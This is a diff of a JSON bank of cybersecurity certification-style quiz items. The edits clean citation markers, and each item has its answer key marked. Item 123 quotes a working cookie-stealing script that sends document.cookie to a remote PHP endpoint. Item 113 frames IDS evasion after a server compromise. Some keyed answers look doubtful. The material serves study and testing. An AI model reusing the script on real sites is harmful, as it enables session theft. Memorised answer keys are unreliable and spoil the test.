-      [cite_start]{ "text": "Public [cite: 2632]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Private [cite: 2629]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Hybrid [cite: 2630]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Community [cite: 2631]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Public [cite: 2632]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 113,
-    "question": "Matthew successfully hacked the server and got root privileges. Now he wants to pivot and stealthy transit the traffic over the network, avoiding the IDS. [cite_start]Which of the following will be the best solution for Matthew? [cite: 2653, 2654, 2655]",
+    "question": "Matthew successfully hacked the server and got root privileges. Now he wants to pivot and stealthy transit the traffic over the network, avoiding the IDS. Which of the following will be the best solution for Matthew? [cite: 2653, 2654, 2655]",
     "category": "Network Security",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Use Alternate Data Streams to hide the outgoing packets from this server. [cite: 2656]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Install Cryptcat and encrypt outgoing packets from this server. [cite: 2657]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Install and use Telnet to encrypt all outgoing traffic from this server. [cite: 2658]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Use HTTP so that all traffic can be routed vis a browser, thus evading the internal Intrusion Detection Systems. [cite: 2659]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Use Alternate Data Streams to hide the outgoing packets from this server. [cite: 2656]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Install Cryptcat and encrypt outgoing packets from this server. [cite: 2657]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Install and use Telnet to encrypt all outgoing traffic from this server. [cite: 2658]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Use HTTP so that all traffic can be routed vis a browser, thus evading the internal Intrusion Detection Systems. [cite: 2659]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 114,
-    [cite_start]"question": "Which of the following methods can keep your wireless network undiscoverable and accessible only to those that know it? [cite: 2664, 2665]",
+    "question": "Which of the following methods can keep your wireless network undiscoverable and accessible only to those that know it? [cite: 2664, 2665]",
     "category": "Wireless Security",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Lock all users [cite: 2666]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Delete the wireless network [cite: 2667]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Disable SSID broadcasting [cite: 2668]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Remove all passwords [cite: 2669]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Lock all users [cite: 2666]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Delete the wireless network [cite: 2667]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Disable SSID broadcasting [cite: 2668]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Remove all passwords [cite: 2669]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 115,
-    [cite_start]"question": "Which of the following is a piece of hardware on a motherboard that generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is impossible? [cite: 2693, 2694]",
+    "question": "Which of the following is a piece of hardware on a motherboard that generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is impossible? [cite: 2693, 2694]",
     "category": "System Security",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "CPU [cite: 2695]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "GPU [cite: 2696]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "TPM [cite: 2697]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "UEFI [cite: 2697]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "CPU [cite: 2695]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "GPU [cite: 2696]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "TPM [cite: 2697]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "UEFI [cite: 2697]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 116,
-    [cite_start]"question": "Which of the following types of attack (that can use either HTTP GET or HTTP POST) allows an attacker to induce users to perform actions that they do not intend to perform? [cite: 2704, 2705]",
+    "question": "Which of the following types of attack (that can use either HTTP GET or HTTP POST) allows an attacker to induce users to perform actions that they do not intend to perform? [cite: 2704, 2705]",
     "category": "Web Application Attacks",
     "image": "",
     "answers": [
-      [cite_start]{ "text": "Browser Hacking [cite: 2706]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Cross-Site Scripting [cite: 2707]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Cross-Site Request Forgery [cite: 2708]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "SQL Injection [cite: 2708]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Browser Hacking [cite: 2706]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Cross-Site Scripting [cite: 2707]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Cross-Site Request Forgery [cite: 2708]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "SQL Injection [cite: 2708]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 117,
-    [cite_start]"question": "Which of the following SQLi types leverages a database server's ability to make DNS requests to pass data to an attacker? [cite: 2757, 2758]",
+    "question": "Which of the following SQLi types leverages a database server's ability to make DNS requests to pass data to an attacker? [cite: 2757, 2758]",
     "category": "SQL Injection",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Union-based SQLi [cite: 2759]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Time-based blind SQLI [cite: 2760]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Out-of-band SQLi [cite: 2761]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "In-band SQLİ [cite: 2761]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Union-based SQLi [cite: 2759]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Time-based blind SQLI [cite: 2760]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Out-of-band SQLi [cite: 2761]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "In-band SQLİ [cite: 2761]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 118,
-    "question": "You enter the URL www.yourbanksite.com into your browser. The website is displayed and prompts you to re-enter your credentials as if you have never visited the site before. You decide to check the URL of the website and notice that the site is not secure and the web address appears different. [cite_start]Which of the following types of attacks have you been exposed to? [cite: 2783, 2784, 2785, 2786]",
+    "question": "You enter the URL www.yourbanksite.com into your browser. The website is displayed and prompts you to re-enter your credentials as if you have never visited the site before. You decide to check the URL of the website and notice that the site is not secure and the web address appears different. Which of the following types of attacks have you been exposed to? [cite: 2783, 2784, 2785, 2786]",
     "category": "DNS Hijacking",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "ARP cache poisoning [cite: 2787]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "DHCP spoofing [cite: 2788]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "DoS attack [cite: 2789]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "DNS hijacking [cite: 2790]", "isCorrect": true, "justification": null, "image": null }
+      { "text": "ARP cache poisoning [cite: 2787]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "DHCP spoofing [cite: 2788]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "DoS attack [cite: 2789]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "DNS hijacking [cite: 2790]", "isCorrect": true, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 119,
-    "question": "The medical company has recently experienced security breaches. After this incident, their patients' personal medical records became available online and easily found using Google. [cite_start]Which of the following standards has the medical organization violated? [cite: 2799, 2800, 2801]",
+    "question": "The medical company has recently experienced security breaches. After this incident, their patients' personal medical records became available online and easily found using Google. Which of the following standards has the medical organization violated? [cite: 2799, 2800, 2801]",
     "category": "Regulatory Standards",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "HIPAA/PHI [cite: 2802]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "PII [cite: 2803]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "ISO 2002 [cite: 2804]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "PCI DSS [cite: 2805]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "HIPAA/PHI [cite: 2802]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "PII [cite: 2803]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "ISO 2002 [cite: 2804]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "PCI DSS [cite: 2805]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 120,
-    [cite_start]"question": "Which of the following type of viruses avoid detection changing their own code, and then cipher itself multiple times as it replicates? [cite: 2823, 2824]",
+    "question": "Which of the following type of viruses avoid detection changing their own code, and then cipher itself multiple times as it replicates? [cite: 2823, 2824]",
     "category": "Malware",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Tunneling virus [cite: 2826]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Encryption virus [cite: 2827]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Cavity virus [cite: 2828]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Stealth virus [cite: 2829]", "isCorrect": true, "justification": null, "image": null }
+      { "text": "Tunneling virus [cite: 2826]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Encryption virus [cite: 2827]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Cavity virus [cite: 2828]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Stealth virus [cite: 2829]", "isCorrect": true, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 121,
-    [cite_start]"question": "Which of the following algorithms uses a 64-bit block size that is encrypted three times with 56-bit keys? [cite: 2851, 2852]",
+    "question": "Which of the following algorithms uses a 64-bit block size that is encrypted three times with 56-bit keys? [cite: 2851, 2852]",
     "category": "Cryptography",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "AES [cite: 2853]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Triple DES [cite: 2854]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "DES [cite: 2855]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "IDEA [cite: 2856]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "AES [cite: 2853]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Triple DES [cite: 2854]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "DES [cite: 2855]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "IDEA [cite: 2856]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 122,
-    "question": "At the moment, your security department is in the vulnerability management lifecycle phase in which is executing the process of applying fixes on vulnerable systems to reduce the impact and severity of vulnerabilities. [cite_start]Which of the following vulnerability-management phases is your security department in? [cite: 2873, 2874, 2875]",
+    "question": "At the moment, your security department is in the vulnerability management lifecycle phase in which is executing the process of applying fixes on vulnerable systems to reduce the impact and severity of vulnerabilities. Which of the following vulnerability-management phases is your security department in? [cite: 2873, 2874, 2875]",
     "category": "Vulnerability Management",
     "image": "",
     "answers": [
-      [cite_start]{ "text": "Verification [cite: 2876]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Remediation [cite: 2877]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Risk assessment [cite: 2878]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Vulnerability scan [cite: 2878]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Verification [cite: 2876]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Remediation [cite: 2877]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Risk assessment [cite: 2878]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Vulnerability scan [cite: 2878]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 123,
-    "question": "You decide to check it out and discover the following code is hidden behind those images: <script> document.write('<img.src=\"https://localhost/submitcookie.php? cookie =\" + escape(document.cookie) +\"\" />'); </script>. [cite_start]What does this script do? [cite: 2898, 2899, 2900, 2901, 2902]",
+    "question": "You decide to check it out and discover the following code is hidden behind those images: <script> document.write('<img.src=\"https://localhost/submitcookie.php? cookie =\" + escape(document.cookie) +\"\" />'); </script>. What does this script do? [cite: 2898, 2899, 2900, 2901, 2902]",
     "category": "Web Application Attacks",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "This PHP file silently executes the code and grabs the user's session cookie and session ID. [cite: 2903]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "The code is a virus that is attempting to gather the user's username and password. [cite: 2904]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "The code injects a new cookie into the browser. [cite: 2905]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "The code redirects the user to another site. [cite: 2906]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "This PHP file silently executes the code and grabs the user's session cookie and session ID. [cite: 2903]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "The code is a virus that is attempting to gather the user's username and password. [cite: 2904]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "The code injects a new cookie into the browser. [cite: 2905]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "The code redirects the user to another site. [cite: 2906]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 124,
-    "question": "After this, you will need to select the vulnerabilities on each machine and start executing only the relevant tests. [cite_start]Which of the following type of vulnerability assessment solutions will you perform? [cite: 2911, 2912]",
+    "question": "After this, you will need to select the vulnerabilities on each machine and start executing only the relevant tests. Which of the following type of vulnerability assessment solutions will you perform? [cite: 2911, 2912]",
     "category": "Vulnerability Analysis",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Inference-based assessment [cite: 2914]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Tree-based assessment [cite: 2914]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Service-based solutions [cite: 2915]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "Product-based solutions [cite: 2916]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Inference-based assessment [cite: 2914]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Tree-based assessment [cite: 2914]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Service-based solutions [cite: 2915]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "Product-based solutions [cite: 2916]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
   },
   {
     "id": 125,
-    [cite_start]"question": "What of the following is a file which is the rich target to discover the structure of a website during web-server footprinting? [cite: 2946, 2947]",
+    "question": "What of the following is a file which is the rich target to discover the structure of a website during web-server footprinting? [cite: 2946, 2947]",
     "category": "Footprinting",
     "image": null,
     "answers": [
-      [cite_start]{ "text": "Robots.txt [cite: 2949]", "isCorrect": true, "justification": null, "image": null },
-      [cite_start]{ "text": "Document root [cite: 2950]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "index.html [cite: 2951]", "isCorrect": false, "justification": null, "image": null },
-      [cite_start]{ "text": "domain.txt [cite: 2952]", "isCorrect": false, "justification": null, "image": null }
+      { "text": "Robots.txt [cite: 2949]", "isCorrect": true, "justification": null, "image": null },
+      { "text": "Document root [cite: 2950]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "index.html [cite: 2951]", "isCorrect": false, "justification": null, "image": null },
+      { "text": "domain.txt [cite: 2952]", "isCorrect": false, "justification": null, "image": null }
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:51:00"
